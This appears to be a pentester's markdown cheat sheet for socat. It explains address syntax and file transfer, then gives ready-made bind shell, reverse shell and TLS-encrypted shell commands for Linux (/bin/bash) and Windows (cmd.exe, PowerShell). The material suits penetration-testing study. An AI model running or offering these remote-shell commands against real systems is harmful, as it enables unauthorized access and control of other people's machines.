## socat - SOcket CAT

Establishes two bidirectional byte streams and transfers data
between them.  Like netcat but has more features

### Overview

The basic usage of socat is:

`socat ADDRESS1[:PARAMS][,options] ADDRESS2[:PARAMS][,options]`

socat uses addresses as the cornerstone of the command.  Running socat requires at least 2 addresses to be specified, which can be IO (STDOUT, STDIN, STDIO), IP's (TCP4,OPENSSL), etc.  

Each address is followed by 0 or more required parameters to describe the address, separated by colons.  For instance, TCP4 requires an IP and port, so a full address specification would look like this `TCP4:1.1.1.1:443`. 

Address descriptors are then followed by 0 or more address options, separated by commas.  One of those options is the `fork` command, which is used on the server to cause any incoming connections to spawn a child process to handle incoming connections, which allows socat to handle multiple connections as well as continue running once a connection ends (rather than automatically exiting).

Socat establishes two unidirectional bytestreams between the two addresses.  For the first stream, the first address descriptor describes the data source and the second describes the data sink.  For the second bytestream, it is reversed with the second address as the data source and the first address as the data sink.  The `-u` option opens only the first bytestream, which ensures that the first address can be only be used for reading and the second address can only be used for writing.

### Basic Connections

#### Server

```bash
sudo socat TCP4-LISTEN:443 STDOUT
# Options
TCP4-LISTEN		# Listen on a port using IPv4
STDOUT			# Connects STDOUT to the TCP socket
```

#### Client

```bash
# Examples
# Connect to remote server
socat - TCP4:1.1.1.1:443
# Options
-	# Synonym for STDIO, which you could put at the end instead.
TCP4:1.1.1.1:443	# This list of Address Types is listed in a colon-delimited list specifying the address type, remote IP, and remote port

```

Note: Root privileges are required to bind to any port below 1024.



### File Transfers

#### Server

```bash
sudo socat TCP4-LISTEN:443,fork file:INFILE
# Options 
fork	# Used with TCP4-LISTEN, spawns a child process to send the file
```

#### Client

```bash
socat TCP4:1.1.1.1:443 file:OUTFILE,create
```

When a client receives the file, it will close the connection automatically.  The server will remain up (because of fork) and ready to transfer the file to any other clients requesting it.  

### Bind Shell

Note that Windows and Linux behave differently here when specifying the bind shell, as seen in the examples, but specified below:

For Linux:  `EXEC:/bin/bash`

For Windows:  `EXEC:cmd.exe,pipes`  OR `EXEC:powershell.exe,pipes`

To highlight these differences, I've noted in the code if it was for Windows or Linux.

#### Server

```bash
# Windows
socat -d -d TCP4-LISTEN:443,fork EXEC:cmd.exe,pipes
# Options
-d -d 	# increases verbosity (shows fatal, error, warning, and notice messages)
fork 			# Spawns a child process for connections 
EXEC:cmd.exe,pipes # Sends cmd shell to client (redirects all STDin/out/err to client)
```

#### Client

```bash
# Linux
socat TCP4:1.1.1.1:443 STDOUT
# Options
STDOUT	# Connects standard output to the TCP socket
		# I'm pretty sure you could also use - for STDIO
```



### Reverse Shell

#### Server

```bash
# Windows
socat -d -d TCP4-LISTEN:443 STDOUT
# Options
-d -d 	# increases verbosity (shows fatal, error, warning, and notice messages)
STDOUT	# Connects standard output to the TCP socket
```

#### Client

```bash
# Linux
socat TCP4:1.1.1.1:443 EXEC:/bin/bash
# Options
EXEC:/bin/bash	# Sends a bash shell to the server (reverse)
```



### Encrypted Bind Shell

Socat transfers everything in plaintext.  Naturally this is not safe when transferring sensitive information during a pentest.  

<u>Note: You must first generate a self-signed certificate and convert it to PEM format with openssl.  Then the listener will use the PEM certificate to encrypt the connection.</u>

#### Server

```bash
# Linux
sudo socat -d -d OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
#Options
-d -d 			# Extra verbosity
OPENSSL-LISTEN	# Creates an SSL socket
cert=file.pem	# Specifies PEM certificate
verify=0		# Disables SSL verification
fork 			# Spawns a child process for connections
EXEC:/bin/bash	# Sends bash shell to client

```

#### Client

```bash
# Windows
socat - OPENSSL:1.1.1.1:443,verify=0
# Options
-	# Synonym for STDIO
```



### Encrypted Reverse Shell

#### Server

```bash
# Linux
sudo socat -d -d OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 STDOUT
```

#### Client

```bash
# Windows
socat OPENSSL:1.1.1.1:443,verify=0 EXEC:cmd.exe,pipes

```

